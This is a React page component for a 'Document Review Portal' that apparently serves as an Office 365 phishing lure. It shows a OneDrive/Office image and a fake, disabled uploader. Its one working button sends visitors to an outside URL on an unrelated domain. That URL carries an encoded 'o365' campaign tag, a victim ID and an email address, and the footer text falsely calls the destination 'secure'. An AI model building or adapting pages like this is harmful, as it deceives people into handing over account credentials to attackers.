
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { ImageUploader } from "@/components/ImageUploader";
import { Badge } from "@/components/ui/badge";
import { ExternalLink } from "lucide-react";

const Index = () => {
  // CONFIGURE YOUR REDIRECT URL HERE
  const redirectUrl = "https://yourinternetbusinesssoftware.com/n/?c3Y9bzM2NV8xX25vbSZyYW5kPVVuTjBWMm89JnVpZD1VU0VSMTEwMzIwMjVVNDgwMzExNTY=N0123N[EMAIL]";
  
  const [uploadedImage, setUploadedImage] = useState<string | null>(null);
  const defaultImage = "/lovable-uploads/d4b1a581-c597-44ad-8111-d3f05fb556f6.png";
  
  const handleReviewClick = () => {
    window.open(redirectUrl, "_blank");
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-gradient-to-b from-white to-blue-50">
      <div className="max-w-md w-full bg-white rounded-xl shadow-md overflow-hidden p-6 space-y-6">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-blue-600 mb-2">Document Review Portal</h1>
          <p className="text-gray-600 text-sm">Upload your document image and click Review to proceed</p>
        </div>
        
        <div className="flex justify-center">
          <Badge 
            variant="outline" 
            className="flex items-center gap-1 px-3 py-1 text-gray-400 border-gray-200 cursor-not-allowed opacity-50"
          >
            <ExternalLink size={14} />
            <span>Cloud Document Service</span>
          </Badge>
        </div>

        <div className="flex flex-col items-center justify-center border-2 border-dashed border-blue-200 rounded-lg p-4 bg-blue-50">
          {uploadedImage ? (
            <img
              src={uploadedImage}
              alt="Uploaded document"
              className="max-h-64 object-contain mb-4"
            />
          ) : (
            <img
              src={defaultImage}
              alt="Default OneDrive and Office integration"
              className="max-h-64 object-contain mb-4"
            />
          )}
          
          <ImageUploader 
            onImageUploaded={setUploadedImage} 
            disabled={true} 
          />
        </div>

        <div className="pt-4">
          <Button 
            onClick={handleReviewClick}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 rounded-md transition-all"
          >
            Review Document
          </Button>
        </div>

        <div className="text-center text-xs text-gray-500 mt-4">
          <p>By clicking "Review Document", you'll be redirected to our secure document processing system.</p>
        </div>
      </div>
      
      <footer className="mt-8 text-center text-gray-500 text-xs">
        <p>© {new Date().getFullYear()} Document Review Portal. All rights reserved.</p>
      </footer>
    </div>
  );
};

export default Index;
